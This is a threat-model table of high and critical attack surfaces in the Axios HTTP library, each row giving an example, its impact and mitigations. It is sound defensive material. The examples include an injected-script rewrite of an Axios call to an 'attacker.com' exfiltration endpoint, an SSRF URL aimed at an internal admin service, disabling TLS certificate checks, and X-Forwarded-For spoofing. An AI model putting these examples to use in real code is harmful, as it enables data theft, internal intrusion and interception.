## Key Attack Surface List - Axios (High & Critical, Directly Involved)

| Description | How Axios Contributes to the Attack Surface | Example | Impact | Risk Severity | Mitigation Strategies |
|---|---|---|---|---|---|
| **Client-Side Request Manipulation** | Axios provides a flexible API for configuring requests, allowing client-side code (potentially compromised) to modify crucial request parameters *before* Axios sends the request. | A malicious script injected via XSS changes the `axios.post('/transfer')` call to `axios.post('https://attacker.com/log')` or modifies the `data` payload to steal credentials, and Axios executes this modified request. | Data exfiltration, unauthorized actions on the server, account takeover. | **Critical** | - **Strict Content Security Policy (CSP)** to prevent XSS, which is the primary enabler of this attack. - **Input validation and sanitization** on the client-side *before* using data in Axios configurations. - **Principle of least privilege** for client-side code accessing Axios configurations. - **Consider using a framework or library that enforces stricter request construction.** |
| **Server-Side Request Forgery (SSRF) via Client-Controlled URLs** | If the application uses Axios on the server-side to make requests based on user-provided URLs, Axios directly facilitates the outbound request to the potentially malicious URL. | A user provides the URL `http://internal-service:8080/admin` which is then directly used as the `url` parameter in a server-side Axios call, causing Axios to make the request. | Access to internal resources, data breaches, denial of service of internal services. | **High** | - **Strictly validate and sanitize user-provided URLs *before* passing them to Axios.** - **Implement a whitelist of allowed domains or IP ranges for outbound requests made by Axios.** - **Use a dedicated service or proxy for making external requests, abstracting away direct Axios usage with user-controlled URLs.** - **Disable or restrict URL schemes that could lead to internal resource access (e.g., `file://`, `gopher://`) within the Axios configuration or through validation.** |
| **Exposure of Sensitive Information in Request/Response Data** | Axios handles the transmission and reception of data, making it the direct mechanism through which sensitive information can be included in requests or responses. |  Developers inadvertently log the entire Axios request object, including authorization headers containing API keys, during development. This log is then accessible. Axios was the tool used to send the request containing the sensitive data. | Leakage of credentials, API keys, personal data, leading to unauthorized access or data breaches. | **High** | - **Avoid logging sensitive request headers or body data when using Axios.** - **Implement proper error handling to prevent sensitive information from being displayed in error messages generated by Axios or related code.** - **Be cautious when using Axios interceptors to log or modify request/response data, ensuring sensitive data is not exposed.** - **Utilize secure methods for storing and retrieving sensitive credentials, preventing them from being directly embedded in Axios configurations.** |
| **Insecure Default Configurations (Potential Misuse)** | Developers might configure Axios in a way that introduces security risks, and Axios will directly implement these configurations. | Setting `httpsAgent: new https.Agent({ rejectUnauthorized: false })` in Node.js when using Axios, directly instructing Axios to bypass TLS certificate validation. | Man-in-the-middle attacks, eavesdropping on sensitive communications facilitated by Axios. | **High** | - **Thoroughly understand Axios configuration options and their security implications.** - **Enforce secure defaults in application configuration, ensuring secure settings are applied to Axios.** - **Regularly review Axios configurations for potential security weaknesses.** - **Avoid disabling TLS verification in production environments when using Axios for HTTPS requests.** |
| **Bypassing Security Measures with Custom Headers** | Axios allows setting arbitrary headers, which can be misused to attempt bypassing security checks that rely on header information. | Setting the `X-Forwarded-For` header to an internal IP address using Axios to try and bypass IP-based access controls on the server. Axios directly sends the request with this manipulated header. | Unauthorized access to restricted resources or functionalities. | **High** | - **Do not rely solely on client-provided headers for security decisions, regardless of how they are set (including via Axios).** - **Implement robust server-side validation and authentication mechanisms that are not easily bypassed by header manipulation.** - **Be aware of the potential for header spoofing when using Axios and implement appropriate countermeasures (e.g., using trusted proxies that sanitize headers).** |
